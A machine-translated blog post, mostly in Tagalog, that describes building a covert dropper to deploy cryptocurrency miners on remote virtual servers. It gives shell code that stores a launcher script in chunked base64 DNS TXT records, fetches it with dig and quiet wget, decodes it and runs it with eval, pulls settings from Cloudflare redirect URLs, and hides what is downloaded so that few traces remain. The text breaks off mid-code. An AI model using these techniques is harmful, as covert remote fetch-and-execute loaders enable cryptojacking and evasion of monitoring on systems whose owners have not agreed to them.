<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=tl><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/tl/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link href=https://www.unto.re/de/posts/chronichles_of_a_cryptonote_dropper hreflang=de rel=alternate><link href=https://www.unto.re/it/posts/chronichles_of_a_cryptonote_dropper hreflang=it rel=alternate><link href=https://www.unto.re/zh/posts/chronichles_of_a_cryptonote_dropper hreflang=zh rel=alternate><link href=https://www.unto.re/es/posts/chronichles_of_a_cryptonote_dropper hreflang=es rel=alternate><link href=https://www.unto.re/hi/posts/chronichles_of_a_cryptonote_dropper hreflang=hi rel=alternate><link href=https://www.unto.re/ar/posts/chronichles_of_a_cryptonote_dropper hreflang=ar rel=alternate><link href=https://www.unto.re/pt/posts/chronichles_of_a_cryptonote_dropper hreflang=pt rel=alternate><link href=https://www.unto.re/bn/posts/chronichles_of_a_cryptonote_dropper hreflang=bn rel=alternate><link href=https://www.unto.re/ru/posts/chronichles_of_a_cryptonote_dropper hreflang=ru rel=alternate><link href=https://www.unto.re/ja/posts/chronichles_of_a_cryptonote_dropper hreflang=ja rel=alternate><link href=https://www.unto.re/pa/posts/chronichles_of_a_cryptonote_dropper hreflang=pa rel=alternate><link href=https://www.unto.re/jw/posts/chronichles_of_a_cryptonote_dropper hreflang=jw rel=alternate><link href=https://www.unto.re/vi/posts/chronichles_of_a_cryptonote_dropper hreflang=vi rel=alternate><link href=https://www.unto.re/fr/posts/chronichles_of_a_cryptonote_dropper hreflang=fr rel=alternate><link href=https://www.unto.re/ur/posts/chronichles_of_a_cryptonote_dropper hreflang=ur rel=alternate><link href=https://www.unto.re/tr/posts/chronichles_of_a_cryptonote_dropper hreflang=tr rel=alternate><link href=https://www.unto.re/pl/posts/chronichles_of_a_cryptonote_dropper hreflang=pl rel=alternate><link href=https://www.unto.re/uk/posts/chronichles_of_a_cryptonote_dropper hreflang=uk rel=alternate><link href=https://www.unto.re/nl/posts/chronichles_of_a_cryptonote_dropper hreflang=nl rel=alternate><link href=https://www.unto.re/el/posts/chronichles_of_a_cryptonote_dropper hreflang=el rel=alternate><link href=https://www.unto.re/sv/posts/chronichles_of_a_cryptonote_dropper hreflang=sv rel=alternate><link href=https://www.unto.re/zu/posts/chronichles_of_a_cryptonote_dropper hreflang=zu rel=alternate><link href=https://www.unto.re/ro/posts/chronichles_of_a_cryptonote_dropper hreflang=ro rel=alternate><link href=https://www.unto.re/ms/posts/chronichles_of_a_cryptonote_dropper hreflang=ms rel=alternate><link href=https://www.unto.re/ko/posts/chronichles_of_a_cryptonote_dropper hreflang=ko rel=alternate><link href=https://www.unto.re/th/posts/chronichles_of_a_cryptonote_dropper hreflang=th rel=alternate><link href=https://www.unto.re/tl/posts/chronichles_of_a_cryptonote_dropper hreflang=tl rel=alternate><link title=" site ng untoreh"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/tl/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.webp property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=en_US property=og:locale><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2022,"@context":"https://schema.org/","image":"/assets/appa.webp","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.webp","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><link href=/css/franklin.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/menu.css rel=stylesheet><link href=/css/pages.css rel=stylesheet><link href=/css/lunr.css rel=stylesheet><link href=/css/footer.css rel=stylesheet><link href=/css/responsive.css rel=stylesheet><link href=/css/animations.css rel=stylesheet><link href=/css/docco.css rel=stylesheet><link href=/css/flags-sprite.css rel=stylesheet><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Chronicles ng isang dropper ng cryptonote</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/tl/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/tl/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2022-08-08T17:30:23.249","inLanguage":"tl","name":"","mainEntityOfPage":{"@id":"/tl/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/tl/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" untoreh-light"class=flip-front src=/assets/appa.webp><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Maghanap sa Website"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/tl/posts/><i class="fas fa-pen menu-icons"></i> mga post</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/tl/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Maghanap sa Website"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/tl/posts/><i class="fas fa-pen menu-icons"></i> mga post</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/tl/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/tl/posts/chronichles_of_a_cryptonote_dropper> Chronicles ng isang dropper ng cryptonote</a></h1><blockquote id=page-description style=font-style:italic>... Gaano kalayo ang nais mong puntahan para sa ... mga pennies?</blockquote></div><div class=franklin-content><p>Ipagpalagay na nais mong mina<a href=https://en.wikipedia.org/wiki/Cryptocurrency> cryptocurrency</a> sa remote<em> virtual</em> hardware. Kailangan mong maghanap ng sa akin. Ang mga malayuang server ay nangangahulugang, hindi<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> o GPU patunay ng mga algorithm sa trabaho, karaniwang lamang<a href=\posts/a-few-notes-on-proof-of-work> Mga barya na palakaibigan sa CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Ang software</a></h2><p>Maghanap at hanapin ang a<a href=https://github.com/xmrig/xmrig> minero</a> , ngunit ito ay hindi talaga maganda, gugustuhin mo ang isang bagay na mas mahusay mong makontrol mula sa malayo, upang makita mo<a href=https://github.com/Bendr0id/xmrigCC> ibang minero</a> . Gusto mo din a<a href=https://github.com/Bendr0id/xmrigcc-proxy> proxy</a> , dahil maraming mga koneksyon ay maikli, hindi mo nais<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> ang mining pool mo. Isa ding<a href=https://github.com/search?q=tunnel> lagusan</a> magiging maganda.<h2 id=the_design><a class=header-anchor href=#the_design> Ang disenyo</a></h2><p>Ang ilang mga botnet ay gumagamit ng data ng mga blockchain upang maghanap ng mga utos,<a href=https://twitter.com/sarahjamielewis> isang tao</a> lilitaw din na mayroon<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> nawalan ng pusta</a> sa hindi ito nangyayari muli ... gayon pa man hindi kami ganoon ka sopistikado, makakarating kami sa ilang mga tala ng DNS na nag-iimbak ng isang script na kumukuha ng kargamento kung aling sarili ang kumukuha sa isang direktoryo ng temp na nagpapatupad at umalis<em> halos</em> walang mga bakas ng pag-set up nito. Narito ang isang maliit na tsart ng daloy na naglalarawan ng istraktura</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher>Launcher</a></h2><p>Ang punto ng isang startup script ay upang ma-access at madaling ma-update tulad ng na makatiis sa pagsubok ng oras. Nag-a-update<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> madali ang mga talaan, at ang DNS ay ang huling bagay na nakakakuha ng pag-shutdown sa loob ng isang network..dahil ang mga IP address ay mahirap tandaan ... kaya't ang mga pagkakataong ito ay magiging magagamit sa lahat ng mga oras. Kita mo kapag tayo<em> pagkuha ng iskrip ng paglawak</em>talagang nagpapatakbo kami ng ilang lohika, ito ang launcher script, kailangan nito ng kakayahang magsagawa ng mga query sa DNS upang maghanap ng aming mga talaan, maaaring nasa lahat ng lugar ang DNS ngunit<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> maghukay</a> ay hindi.<p>Mayroong kaunting isang pagpapakaabala dito, kung kailangan naming mag-download ng isa pang tool<em> upang mag-download ng isa pang script upang mai-download ang payload</em> dapat lang natin i-download ang payload! Sa pagtatanggol ... ang paggawa ng masusulat na sayaw na ito ay nagdaragdag sa pagkalito, pinapayagan na mapanatili lamang ang isang pagpapatupad ng launcher (mapanatili, oo), hindi kinakailangan ng karamihan sa mga oras..kaya nagsisilbi din kami<a href=https://en.wikipedia.org/wiki/Standalone_program> statically naka-link</a> maipatupad upang maisagawa ang mga query sa dns, nakuha sa pamamagitan ng sariling pag-host, o cloud hosting (oo may mga fallback, tulad ng 3 o 4, dahil ang mga serbisyo sa cloud ay may napakaliit na libreng bandwidth, at nangangailangan din ng cookies o pag-access ng mga token ... napaka script nila hindi magiliw, sadyang kaya, syempre).<p>Ano ang nasa mga tala ng dns? Ginagamit namin<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> mga talaan, sa isang pasadyang domain (mga fallback din dito). Bakit TXT? mangyari na ang mga iyon ay maaaring mag-imbak ng pinakamalaking dami ng data..karaniwan dahil ito ay uri ng<a href=https://www.ietf.org/rfc/rfc6763.txt> inirekomenda</a> depende sa<em> mga bagay</em> . Partikular naming ginagamit<a href=https://www.cloudflare.com/> cloudflare</a> para sa aming DNS fiddling dahil libre ito, at halos ang nag-iisang manlalaro sa bayan (<em> well hindi talaga ngunit anumang iba pang mga alternatibong pales tampok matalino</em> ). Ito ay nangyayari na maaari kang mag-imbak ng maraming mga piraso ng data sa<em> pareho</em> record ... nagsisimula itong makakuha ng nakalilito at pag-aagawan para sa ilang mga pagtutukoy ... (tangent) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> dati</a> payagan<em> nakakadena</em>Ang mga tala ng TXT na kabuuan ~ 9k bytes, isinasaad ng mga doc ngayon ~ 2k bytes, bago ang pagbabago na ginagamit ko ~ 6k Sa palagay ko, at hinahatid ang script na hindi na-compress, pagkatapos nito ay kailangan kong manipis ang script at i-compress ito bago iabot ang kamay (talagang ako sinubukan gamitin ang a<a href=https://freedns.afraid.org/> mga kalayaan</a> provider, pinagbawalan ako sa loob ng isang araw, hulaan na mayroon silang isang mahigpit na patakaran sa mga tala ng TXT na walang taba), subalit ang compression ng gzip ay lilitaw na HINDI magiging palakaibigan sa tubo at nagdudulot pa rin ng mga problema, kaya't kailangang pamahalaan ang pag-cram ng script nang walang compression ( pagtatapos tangay).<p>Paano natin ito maiimbak? Sinusuportahan lamang ng mga tala ng TXT ang mga string ng alphanumeric, hindi<a href=https://en.wikipedia.org/wiki/Null_character> Mga NUL</a> , kaya kailangan nating balutin ito sa isang hindi null na pag-encode,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> nasiyahan ang pagpipigil na ito, at dahil nag-iimbak kami<em> nakakadena</em> Ang mga tala ng TXT, kailangan nating putulin ang output, dahil gumagamit kami ng mga bagay na shell, tapos ito sa pamamagitan ng<code>-w</code> flag, sa busybox tulad ng bandila dati na wala (o opt-in) sa mga mas lumang bersyon na nakakainis, isang kahalili ay ang paggamit ng encoder na naka-bundle ng openssl,<code>openssl enc -base64</code>.<p>Ngayon alam na namin kung paano iimbak ang aming script ng paglawak ay iniimbak namin ito sa alinman<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf kli</a> o mano-mano. Paano natin ito hinuhugot? Nabanggit namin na kailangan namin ng mga bindutil o sa amin<code>dig</code> ... pagkatapos mapili ang paghahatid ng endpoint, nais naming i-download ito, karaniwang magagamit ang magagamit<a href=https://www.gnu.org/software/wget/> wget</a> o<a href=https://curl.se/> kulot</a> , ang wget ay natagpuan na na-preinstall nang mas madalas, subalit ang busybox ay nagbibigay lamang ng suporta sa tls sa mga pabagu-bagong aklatan, kaya't tiyakin mong ang endpoint ay naghahatid ng http o ang iyong utility ay<code>wget</code> mula sa gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Ibig sabihin subukan<code>-t2</code> oras na naghihintay<code>-T10</code> segundo na<code>-q</code> tahimik na pagbabasa mula<code>-i-</code> stdin (<code>$digurl</code> ) at pagsusulat sa<code>-O-</code> stdout (<code>$filename</code>). Hindi isiniwalat ng utos na ito kung ano ang nai-download namin sa unang tingin. Kami ay magiging maingat sa iba pang mga utos ng shell para sa parehong dahilan, o nananatili sa shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) built-in kung posible. Pag-alagaan din ang tungkol sa kung saan mo nai-download ang iyong mga naipapatupad, nais mong matiyak na maaari mong maisagawa ang mga ito, dahil ang ilang mga mount point, lalo na sa mga lalagyan at<code>tmp</code> mga landas ay<code>noexec</code> . Ngayon na mayroon kaming aming tool sa pag-query ng dns kinuha namin ang aming mga talaan<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +<span class=hljs-built_in>timeout</span>=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Ang mga watawat ay nagpapaliwanag dito,<code>+short</code> nangangahulugan lamang na interesado lamang kami sa mismong data, upang hindi namin mai-parse ang output. Mahalagang tukuyin ang DNS server, tulad ng google (<code>8.8.8.8</code> ) o cloudflare (<code>1.1.1.1</code> ) iyan sapagkat maraming mga kapaligiran ang nagre-redirect o nag-uudyok ng mga query ng dns sa kanilang sariling mga server ng dns bilang default. Matapos makuha ang chunked script ay nakikipag-usap kami sa mga quote at whitespaces upang gawin itong handa para sa pag-decode<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Paano kung ngayon tayo<em> pa rin</em> wala ang launcher natin? Magulo ang DNS, gusto namin ng isang fallback, hinahayaan ang pag-set up ng isang subdomain upang direktang makuha ang launcher script. Bago suriin ang aming script nais naming ipasadya ito, na may ilang mga variable, muling hinahayaan na gumamit ng isang tala ng TXT upang mag-imbak ng isang NAME = VALUE listahan ng mga variable at i-parse ito. Mayroon ding fallback para sa mga variable, nag-aalok ang cloudflare ng mga pag-redirect batay sa mga URL, hinahatid ang mga pag-redirect na ito<em> dati pa</em> ang patutunguhan, kaya hindi namin kailangan ng isang endpoint, nais lang naming i-configure ang mga patakaran sa pag-redirect ng regex batay sa isang kathang-isip na endpoint, kung ano ang interesado kami ay ang mga parameter ng url<code>?NAME=VALUE&NAME2=VALUE2...</code>, upang maaari naming parametrize ang aming launcher sa pamamagitan lamang ng pagbabago ng redirect url, palaging may pansin sa pag-quote at makatakas na mga code<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>Ang wget<code>-S</code> naka-print ang redirect url na interesado kami para sa pag-parse. Ang pagkakaroon ng mga parameter at script, sinusuri namin ang mga variable na sumusulat sa kanila sa isang file<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Ang file na ito ay mapagkukunan ng ay deploy script. Ang huling bahagi ng startup script ay upang aktwal<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampolin</a> , suriin ang script sa loob ng kasalukuyang proseso ng shell, o baka hayaan itong pamahalaan ng tmux kung maaari.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
